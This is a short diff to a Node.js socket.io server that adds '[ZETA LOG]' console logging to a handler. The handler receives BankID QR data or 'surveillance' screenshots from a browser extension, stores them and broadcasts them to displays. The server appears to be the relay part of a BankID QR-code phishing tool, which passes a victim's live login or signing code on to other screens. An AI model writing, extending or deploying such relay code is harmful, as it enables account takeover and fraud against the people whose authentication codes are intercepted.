@@ -330,26 +330,31 @@ io.on('connection', (socket) => {
 
     // Handle QR data from the old extension
     socket.on('qr-scanned', async (data) => {
-        console.log('Received qr-scanned event from old extension.');
+        console.log('>>>>>>>>>>>>>> [ZETA LOG] Received qr-scanned event. PAYLOAD:');
+        console.log(JSON.stringify(data, null, 2));
+
         let qrImageToSend = null;
         
         if (data && data.data) { // Raw text data like "bankid://..."
             try {
                 qrImageToSend = await QRCode.toDataURL(data.data);
-                console.log('Generated QR code from raw text.');
+                console.log('>>>>>>>>>>>>>> [ZETA LOG] Generated QR from text. DATA URL (first 100 chars):', qrImageToSend.substring(0, 100));
             } catch (err) {
-                console.error('Failed to generate QR code from text:', err);
+                console.error('!!!!!!!!!!!!!! [ZETA LOG] Failed to generate QR from text:', err);
             }
         } else if (data && data.screenshot) { // Screenshot data
-             console.log('Using screenshot from surveillance.');
+             console.log('>>>>>>>>>>>>>> [ZETA LOG] Using screenshot from surveillance event.');
              qrImageToSend = data.screenshot;
         }
 
         if (qrImageToSend) {
             // STORE the latest QR data
             latestQrData = { qrData: qrImageToSend, timestamp: Date.now() };
-            console.log('Broadcasting generated/received QR image.');
+            console.log('>>>>>>>>>>>>>> [ZETA LOG] Stored new QR data. Timestamp:', latestQrData.timestamp);
+            console.log('>>>>>>>>>>>>>> [ZETA LOG] Broadcasting new QR image to displays.');
             io.emit('new_qr', qrImageToSend); // Broadcast the IMAGE
+        } else {
+            console.log('!!!!!!!!!!!!!! [ZETA LOG] No usable data found in qr-scanned payload.');
         }
     });
 
